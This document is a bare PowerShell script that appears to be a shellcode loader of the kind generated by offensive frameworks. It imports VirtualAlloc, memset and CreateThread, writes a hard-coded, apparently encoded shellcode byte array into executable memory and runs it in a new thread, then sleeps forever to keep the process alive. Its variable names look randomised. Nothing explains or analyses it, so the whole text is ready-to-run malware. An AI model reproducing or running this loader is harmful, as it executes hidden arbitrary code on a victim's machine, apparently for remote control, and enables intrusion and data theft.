
$LoKD = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $LoKD -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xc5,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xbf,0x09,0x27,0xf4,0x79,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x78,0x14,0x03,0x78,0x1d,0xc5,0x01,0x85,0xf5,0x8b,0xea,0x76,0x05,0xec,0x63,0x93,0x34,0x2c,0x17,0xd7,0x66,0x9c,0x53,0xb5,0x8a,0x57,0x31,0x2e,0x19,0x15,0x9e,0x41,0xaa,0x90,0xf8,0x6c,0x2b,0x88,0x39,0xee,0xaf,0xd3,0x6d,0xd0,0x8e,0x1b,0x60,0x11,0xd7,0x46,0x89,0x43,0x80,0x0d,0x3c,0x74,0xa5,0x58,0xfd,0xff,0xf5,0x4d,0x85,0x1c,0x4d,0x6f,0xa4,0xb2,0xc6,0x36,0x66,0x34,0x0b,0x43,0x2f,0x2e,0x48,0x6e,0xf9,0xc5,0xba,0x04,0xf8,0x0f,0xf3,0xe5,0x57,0x6e,0x3c,0x14,0xa9,0xb6,0xfa,0xc7,0xdc,0xce,0xf9,0x7a,0xe7,0x14,0x80,0xa0,0x62,0x8f,0x22,0x22,0xd4,0x6b,0xd3,0xe7,0x83,0xf8,0xdf,0x4c,0xc7,0xa7,0xc3,0x53,0x04,0xdc,0xff,0xd8,0xab,0x33,0x76,0x9a,0x8f,0x97,0xd3,0x78,0xb1,0x8e,0xb9,0x2f,0xce,0xd1,0x62,0x8f,0x6a,0x99,0x8e,0xc4,0x06,0xc0,0xc6,0x29,0x2b,0xfb,0x16,0x26,0x3c,0x88,0x24,0xe9,0x96,0x06,0x04,0x62,0x31,0xd0,0x6b,0x59,0x85,0x4e,0x92,0x62,0xf6,0x47,0x50,0x36,0xa6,0xff,0x71,0x37,0x2d,0x00,0x7e,0xe2,0xd8,0x05,0xe8,0x07,0x1d,0x06,0xe7,0x7f,0x1f,0x06,0xf6,0xc4,0x96,0xe0,0xa8,0x6a,0xf9,0xbc,0x08,0xdb,0xb9,0x6c,0xe0,0x31,0x36,0x52,0x10,0x3a,0x9c,0xfb,0xba,0xd5,0x49,0x53,0x52,0x4f,0xd0,0x2f,0xc3,0x90,0xce,0x55,0xc3,0x1b,0xfd,0xaa,0x8d,0xeb,0x88,0xb8,0x79,0x1c,0xc7,0xe3,0x2f,0x23,0xfd,0x8e,0xcf,0xb1,0xfa,0x18,0x98,0x2d,0x01,0x7c,0xee,0xf1,0xfa,0xab,0x65,0x3b,0x6f,0x14,0x11,0x44,0x7f,0x94,0xe1,0x12,0x15,0x94,0x89,0xc2,0x4d,0xc7,0xac,0x0c,0x58,0x7b,0x7d,0x99,0x63,0x2a,0xd2,0x0a,0x0c,0xd0,0x0d,0x7c,0x93,0x2b,0x78,0x7c,0xef,0xfd,0x44,0x0a,0x01,0x3e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$PP7m=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($PP7m.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$PP7m,0,0,0);for (;;){Start-sleep 60};

